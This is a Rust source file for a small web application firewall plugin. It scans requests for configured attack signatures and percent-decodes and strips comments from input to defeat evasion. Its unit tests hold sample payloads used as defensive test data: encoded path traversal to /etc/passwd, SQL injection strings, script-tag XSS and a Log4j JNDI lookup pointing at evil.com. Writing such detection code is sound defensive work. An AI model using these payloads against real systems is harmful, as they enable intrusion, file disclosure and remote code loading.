//! Zero-Regex Fast Byte Scanning and Anti-Evasion Normalization Engine for `waf_lite`.
//!
//! ```text
//!  +─────────────────────────────────────────────────────────────────────────+
//!  |                WAF_LITE BYTE STREAMING & ANTI-EVASION ENGINE            |
//!  +─────────────────────────────────────────────────────────────────────────+
//!  |                                                                         |
//!  |  Input Slice (&[u8]): URI Path, Query, or Leading Body (<= 32 KB)       |
//!  |                                │                                        |
//!  |                                ▼                                        |
//!  |                     [Fast-Path: needs_normalization]                    |
//!  |                     (Checks '%', '+', uppercase, '/*', '--', '#')       |
//!  |                         /                         \                     |
//!  |                       NO                          YES                   |
//!  |                       /                             \                   |
//!  |           (Zero-Copy Direct)              (Stack Buffer <= 1024B)       |
//!  |           AhoCorasick::find()             1. decode_percent_multi_pass  |
//!  |                   │                          (up to 3 nested passes)    |
//!  |                   │                       2. Stage A: AhoCorasick scan  |
//!  |                   │                          (catches /*<script>*/)     |
//!  |                   │                       3. compact_whitespace_comments|
//!  |                   │                       4. Stage B: AhoCorasick scan  |
//!  |                   │                          (catches UNION/**/SELECT)  |
//!  |                   └───────────────┬───────────────┘                     |
//!  |                                   ▼                                     |
//!  |                          bool (Match / Clean)                           |
//!  +─────────────────────────────────────────────────────────────────────────+
//! ```

use aho_corasick::{AhoCorasick, MatchKind};

use crate::error::PluginError;

/// High-performance SIMD multi-pattern Aho-Corasick matching engine for WAF Lite.
#[derive(Clone, Debug)]
pub struct WafMatcher {
    pattern_ac: Option<AhoCorasick>,
}

impl WafMatcher {
    /// Compiles configured attack patterns into a SIMD-accelerated Aho-Corasick automaton.
    ///
    /// Normalizes each pattern (`trim` + ASCII lowercase) and deduplicates repeats.
    /// An empty pattern list produces a no-op matcher with zero scanning overhead.
    pub fn new(patterns: &[String]) -> Result<Self, PluginError> {
        let mut normalized: Vec<String> = Vec::with_capacity(patterns.len());
        for pat in patterns {
            let lower = pat.trim().to_ascii_lowercase();
            if !lower.is_empty() {
                normalized.push(lower);
            }
        }
        normalized.sort_unstable();
        normalized.dedup();

        if normalized.is_empty() {
            return Ok(Self { pattern_ac: None });
        }

        let pattern_ac = AhoCorasick::builder()
            .match_kind(MatchKind::Standard)
            .build(&normalized)
            .map_err(|e| {
                PluginError::Config(format!("Failed to compile WAF pattern automaton: {e}"))
            })?;

        Ok(Self {
            pattern_ac: Some(pattern_ac),
        })
    }

    /// Returns `true` if no patterns are configured in this matcher.
    #[inline(always)]
    pub fn is_empty(&self) -> bool {
        self.pattern_ac.is_none()
    }

    /// Evaluates raw input bytes against all configured attack signatures with anti-evasion normalization.
    ///
    /// Executes in two defensive stages when comment/whitespace markers are present:
    /// - **Stage A**: Scans percent-decoded, lowercased bytes *before* SQL comment stripping so
    ///   attackers cannot hide XSS (`/*<script>*/`), Log4j (`/*${jndi:...}*/`), or RCE (`/*;whoami*/`) inside SQL comments.
    /// - **Stage B**: Strips SQL inline/line comments (`/**/`, `--...\n`, `#...\n`) and collapses whitespace
    ///   in-place to catch comment-fragmented SQLi (`UNION/**/SELECT`, `UNION--\nSELECT`).
    #[inline]
    pub fn check_bytes(&self, bytes: &[u8], convert_plus: bool) -> bool {
        let Some(ac) = &self.pattern_ac else {
            return false;
        };
        if bytes.is_empty() {
            return false;
        }

        if !needs_normalization(bytes, convert_plus) {
            return ac.find(bytes).is_some();
        }

        if bytes.len() <= 1024 {
            let mut stack_buf = [0u8; 1024];
            let (decoded_len, has_compaction_markers) =
                decode_percent_multi_pass(bytes, convert_plus, &mut stack_buf);
            if ac.find(&stack_buf[..decoded_len]).is_some() {
                return true;
            }
            if has_compaction_markers {
                let compact_len = compact_whitespace_and_comments(&mut stack_buf, decoded_len);
                return ac.find(&stack_buf[..compact_len]).is_some();
            }
            false
        } else {
            let mut heap_buf = vec![0u8; bytes.len()];
            let (decoded_len, has_compaction_markers) =
                decode_percent_multi_pass(bytes, convert_plus, &mut heap_buf);
            if ac.find(&heap_buf[..decoded_len]).is_some() {
                return true;
            }
            if has_compaction_markers {
                let compact_len = compact_whitespace_and_comments(&mut heap_buf, decoded_len);
                return ac.find(&heap_buf[..compact_len]).is_some();
            }
            false
        }
    }
}

/// Converts a hex ASCII character to its 4-bit numeric value.
#[inline(always)]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Performs up to 3 passes of percent-decoding, ASCII lowercasing, and optional `+` to space conversion.
/// Returns `(decoded_len, has_compaction_markers)` where `has_compaction_markers` indicates whether
/// whitespace folding or SQL comment stripping is needed.
#[inline]
fn decode_percent_multi_pass(input: &[u8], convert_plus: bool, out: &mut [u8]) -> (usize, bool) {
    let mut i = 0;
    let mut o = 0;
    let mut produced_percent = false;
    let mut has_compaction_markers = false;
    let mut prev_space = false;

    while i < input.len() && o < out.len() {
        let mut b = input[i];
        if b == b'%' && i + 2 < input.len() {
            if let (Some(v1), Some(v2)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                let decoded = (v1 << 4) | v2;
                if decoded == b'%' {
                    produced_percent = true;
                }
                b = decoded.to_ascii_lowercase();
                if convert_plus && b == b'+' {
                    b = b' ';
                }
                i += 3;
            } else {
                b = b.to_ascii_lowercase();
                i += 1;
            }
        } else {
            b = b.to_ascii_lowercase();
            if convert_plus && b == b'+' {
                b = b' ';
            }
            i += 1;
        }

        if matches!(b, b'\t' | b'\r' | b'\n' | b'#')
            || (b == b' ' && prev_space)
            || (o > 0 && ((out[o - 1] == b'/' && b == b'*') || (out[o - 1] == b'-' && b == b'-')))
        {
            has_compaction_markers = true;
        }
        prev_space = b == b' ';
        out[o] = b;
        o += 1;
    }

    let mut len = o;
    let mut passes = 1;
    while produced_percent && passes < 3 {
        let mut r = 0;
        let mut w = 0;
        produced_percent = false;
        prev_space = false;
        while r < len {
            let mut b = out[r];
            if b == b'%' && r + 2 < len {
                if let (Some(v1), Some(v2)) = (hex_val(out[r + 1]), hex_val(out[r + 2])) {
                    let decoded = (v1 << 4) | v2;
                    if decoded == b'%' {
                        produced_percent = true;
                    }
                    b = decoded.to_ascii_lowercase();
                    if convert_plus && b == b'+' {
                        b = b' ';
                    }
                    r += 3;
                } else {
                    r += 1;
                }
            } else {
                if convert_plus && b == b'+' {
                    b = b' ';
                }
                r += 1;
            }

            if matches!(b, b'\t' | b'\r' | b'\n' | b'#')
                || (b == b' ' && prev_space)
                || (w > 0
                    && ((out[w - 1] == b'/' && b == b'*') || (out[w - 1] == b'-' && b == b'-')))
            {
                has_compaction_markers = true;
            }
            prev_space = b == b' ';
            out[w] = b;
            w += 1;
        }
        len = w;
        passes += 1;
    }

    (len, has_compaction_markers)
}

/// In-place whitespace folding and SQL comment collapsing (`/* ... */`, `-- ...[\r\n]`, `# ...[\r\n]`).
///
/// Security invariants:
/// 1. Comments never cross `&` (query parameter delimiter), `<` (HTML tag), or `$` (expression lookup),
///    preventing cross-parameter comment smuggling (`?a=/*&id=union+select&b=*/`).
/// 2. Single-line comments (`--` and `#`) only fold when terminated by `\n` or `\r`, preventing
///    unterminated `-- ` from truncating the remainder of the query string.
#[inline]
fn compact_whitespace_and_comments(buf: &mut [u8], len: usize) -> usize {
    let mut r = 0;
    let mut w = 0;
    let mut last_was_space = false;

    while r < len {
        // 1. Detect bounded SQL inline comment: /* ... */ (except MySQL /*! versioned execution)
        if buf[r] == b'/'
            && r + 1 < len
            && buf[r + 1] == b'*'
            && (r + 2 >= len || buf[r + 2] != b'!')
        {
            let mut end = r + 2;
            let mut found = false;
            while end + 1 < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if buf[end] == b'*' && buf[end + 1] == b'/' {
                    found = true;
                    break;
                }
                end += 1;
            }
            if found {
                r = end + 2;
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        // 2. Detect SQL single-line comment: -- followed by [\r\n] within same parameter
        if buf[r] == b'-' && r + 1 < len && buf[r + 1] == b'-' {
            let mut end = r + 2;
            let mut has_newline = false;
            while end < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if matches!(buf[end], b'\n' | b'\r') {
                    has_newline = true;
                    break;
                }
                end += 1;
            }
            if has_newline {
                r = end + 1;
                while r < len && matches!(buf[r], b'\n' | b'\r') {
                    r += 1;
                }
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        // 3. Detect SQL single-line comment: # followed by [\r\n] within same parameter
        if buf[r] == b'#' {
            let mut end = r + 1;
            let mut has_newline = false;
            while end < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if matches!(buf[end], b'\n' | b'\r') {
                    has_newline = true;
                    break;
                }
                end += 1;
            }
            if has_newline {
                r = end + 1;
                while r < len && matches!(buf[r], b'\n' | b'\r') {
                    r += 1;
                }
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        let b = buf[r];
        if b == b' ' || b == b'\t' || b == b'\r' || b == b'\n' {
            if !last_was_space {
                buf[w] = b' ';
                w += 1;
                last_was_space = true;
            }
        } else {
            buf[w] = b;
            w += 1;
            last_was_space = false;
        }
        r += 1;
    }

    w
}

/// Fast-path inspector checking whether input bytes require any normalization.
#[inline(always)]
pub fn needs_normalization(bytes: &[u8], convert_plus: bool) -> bool {
    let mut prev_space = false;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'%' || b.is_ascii_uppercase() {
            return true;
        }
        if convert_plus && b == b'+' {
            return true;
        }
        if b == b'/' && i + 1 < bytes.len() && bytes[i + 1] == b'*' {
            return true;
        }
        if b == b'-' && i + 1 < bytes.len() && bytes[i + 1] == b'-' {
            return true;
        }
        if b == b'#' || b == b'\t' || b == b'\r' || b == b'\n' {
            return true;
        }
        if b == b' ' {
            if prev_space {
                return true;
            }
            prev_space = true;
        } else {
            prev_space = false;
        }
        i += 1;
    }
    false
}

#[cfg(test)]
fn normalize_bytes_into(bytes: &[u8], convert_plus: bool, out: &mut [u8]) -> usize {
    let (len, has_compaction_markers) = decode_percent_multi_pass(bytes, convert_plus, out);
    if has_compaction_markers {
        compact_whitespace_and_comments(out, len)
    } else {
        len
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_percent_decode_and_case_folding() {
        let input = b"%2e%2e%2fetc%2fPasswd";
        let mut out = [0u8; 64];
        let len = normalize_bytes_into(input, false, &mut out);
        assert_eq!(&out[..len], b"../etc/passwd");
    }

    #[test]
    fn test_double_and_triple_percent_decoding_anti_evasion() {
        let input = b"%252e%252e%252fetc%252fpasswd";
        let mut out = [0u8; 64];
        let len = normalize_bytes_into(input, false, &mut out);
        assert_eq!(&out[..len], b"../etc/passwd");

        let triple = b"%25252e%25252e%25252fetc%25252fpasswd";
        let len3 = normalize_bytes_into(triple, false, &mut out);
        assert_eq!(&out[..len3], b"../etc/passwd");
    }

    #[test]
    fn test_form_urlencoded_plus_to_space_conversion() {
        let input = b"id=1%27+OR+%271%27%3D%271";
        let mut out = [0u8; 64];
        let len = normalize_bytes_into(input, true, &mut out);
        assert_eq!(&out[..len], b"id=1' or '1'='1");
    }

    #[test]
    fn test_whitespace_and_inline_comment_collapsing() {
        let input = b"id=1+UNION%2F*%20obfuscated%20*%2FSELECT+1,2";
        let mut out = [0u8; 128];
        let len = normalize_bytes_into(input, true, &mut out);
        assert_eq!(&out[..len], b"id=1 union select 1,2");
    }

    #[test]
    fn test_single_line_sql_comments_collapsing() {
        let input = b"id=1+UNION--comment%0ASELECT+1";
        let mut out = [0u8; 128];
        let len = normalize_bytes_into(input, true, &mut out);
        assert_eq!(&out[..len], b"id=1 union select 1");
    }

    #[test]
    fn test_prevents_comment_wrapping_and_parameter_smuggling_bypasses() {
        let matcher = WafMatcher::new(&[
            "<script".to_string(),
            "${jndi:".to_string(),
            "union select".to_string(),
        ])
        .unwrap();

        assert!(matcher.check_bytes(b"q=/*<script>alert(1)</script>*/", true));
        assert!(matcher.check_bytes(b"q=/*${jndi:ldap://evil.com}*/", true));
        assert!(!matcher.check_bytes(b"a=/*&id=union+hello&b=*/", true));
        assert!(matcher.check_bytes(b"a=/*&id=union+select&b=*/", true));
        assert!(!matcher.check_bytes(b"q=hello--world&next=test", true));
    }

    #[test]
    fn test_empty_matcher_allows_everything() {
        let matcher = WafMatcher::new(&[]).unwrap();
        assert!(matcher.is_empty());
        assert!(!matcher.check_bytes(b"../../etc/passwd", false));
        assert!(!matcher.check_bytes(b"<script>alert(1)</script>", true));
    }

    #[test]
    fn test_config_driven_patterns_only() {
        let matcher = WafMatcher::new(&["../".to_string(), "union select".to_string()]).unwrap();
        assert!(matcher.check_bytes(b"/static/%2e%2e%2fetc/passwd", false));
        assert!(matcher.check_bytes(b"id=1+UNION/**/SELECT+1", true));
        // Pattern not in config must not match (WYCIWIS)
        assert!(!matcher.check_bytes(b"<script>alert(1)</script>", true));
    }
}
